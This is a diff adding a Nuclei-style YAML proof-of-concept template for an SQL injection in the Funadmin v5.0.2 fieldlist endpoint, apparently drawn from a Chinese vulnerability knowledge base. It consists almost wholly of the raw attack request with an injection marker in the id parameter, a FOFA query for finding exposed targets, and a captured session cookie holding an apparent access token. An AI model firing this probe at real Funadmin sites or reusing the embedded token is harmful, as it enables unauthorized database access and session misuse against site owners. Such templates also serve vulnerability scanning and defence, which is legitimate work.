@@ -1,0 +1,39 @@
+id: poc-spy0vl03o3fk7kcx
+info:
+  name: Funadmin v5.0.2 fieldlist存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/spy0vl03o3fk7kcx'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: spy0vl03o3fk7kcx
+    fofa: '"FunAdmin"'
+http:
+- raw:
+  - 'GET /curd/table/fieldlist?id=fun_test* HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Pragma: no-cache
+
+    Cache-Control: no-cache
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: PHPSESSID=84a79679dc650a2da1270dfa0aed683d; Hm_lvt_8dcaf664827c0e8ae52287ebb2411aed=1726387527; HMACCOUNT=95CE0233E2123413; auth_account=YToxOntzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI3OiJleUowZVhBaU9pSktWMVFpTENKaGJHY2lPaUpJVXpJMU5pSjkuZXlKdFpXMWlaWEpmYVdRaU9qTTBORFlzSW1Gd2NHbGtJam9pSWl3aVlYQndjMlZqY21WMElqb2lJaXdpYVhOeklqb2lhSFIwY0hNNkx5OTNkM2N1Wm5WdVlXUnRhVzR1WTI5dElpd2lZWFZrSWpvaWFIUjBjSE02THk5M2QzY3VablZ1WVdSdGFXNHVZMjl0SWl3aWMyTnZjR1Z6SWpvaWNtOXNaVjloWTJObGMzTWlMQ0pwWVhRaU9qRTNNall6T1RFeU5qWXNJbTVpWmlJNk1UY3lOak01TVRJMk5pd2laWGh3SWpveE56STNNRGd5TkRZMmZRLjZOcloyN2ozclluNW82V29rXzMxZlEwRmxIdlB5ZlgtSm9GTnBIMTExWDAiO30%3D; clound_account=YTo0OntzOjI6ImlkIjtpOjM0NDY7czo4OiJ1c2VybmFtZSI7czo0OiJjZW5nIjtzOjg6Im5pY2tuYW1lIjtzOjA6IiI7czo2OiJhdmF0YXIiO3M6Mzc6Ii9zdGF0aWMvZnJvbnRlbmQvaW1hZ2VzL2F2YXRhci8xMi5qcGciO30%3D; Hm_lpvt_8dcaf664827c0e8ae52287ebb2411aed=1726403989; think_lang=zh-cn; tablename=fun_addons_demo_cate
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
